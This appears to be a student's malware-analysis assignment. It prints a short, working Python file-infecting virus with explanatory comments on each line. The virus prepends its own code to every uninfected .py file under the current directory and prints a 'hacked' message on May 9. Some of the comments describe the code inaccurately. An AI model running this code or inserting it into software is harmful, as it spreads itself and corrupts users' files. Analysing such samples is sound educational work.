# Script:                       Ops Challenge 14
# Author:                       Matt Hoos
# Date of latest revision:      9/16/22
# Purpose:                      Python Malware Analysis on someone else's code

##*****-------  DO NOT RUN THIS  ------*****

#!/usr/bin/python
# Load Python and import the OS and DATETIME Libraries
import os
import datetime

# Define a variable named SIGNATURE and set it to VIRUS
SIGNATURE = "VIRUS"

# Define a function called locate which identifies a list of files as targets and sorts out previously infected files.
def locate(path):
    files_targeted = []  # Creates an empty array
    filelist = os.listdir(path)  # Get list of files from the current folder
    for fname in filelist:  # Loop through all files in the filelist
        if os.path.isdir(path+"/"+fname):  # Check if path is an existing directory
            files_targeted.extend(locate(path+"/"+fname))  # Adds this current path and files to the files_targeted list
        elif fname[-3:] == ".py":  # Check if the file is Python and has the signature, if so break, else add it to the list
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)  # Adds file to list if it is not tagged as infected
    return files_targeted  # Returns the newly inflated files_targeted list

# Define function infect and enumerate list of files_targeted, then write 39 blank lines into the beginning of the file
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))  # Select the file
    virusstring = ""  # Set a blank line
    for i,line in enumerate(virus):  # For each line in a file up to line 39, loop
        if 0 <= i < 39:
            virusstring += line  # Add the contents of the first 39 lines to the variable virusstring
    virus.close
    for fname in files_targeted:  # For each file in the list, read the contents fo the file
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")  # while in the for loop, write the contents
        f.write(virusstring + temp)  # but include the first 39 lines from the first selected file
        f.close()

# Define function to check that the date is May 9th and print the message.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:  # Test if the month and day are 5 and 9
        print "You have been hacked"


# First line gathers the filelist from the current path
# Second line bloats the files
# Third line prints a message on the 9th of May
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()

# Perform an analysis of the Python-based code.
# Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
# Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
# Insert comments above the final three lines explaining how the functions are called and what this script appears to do.
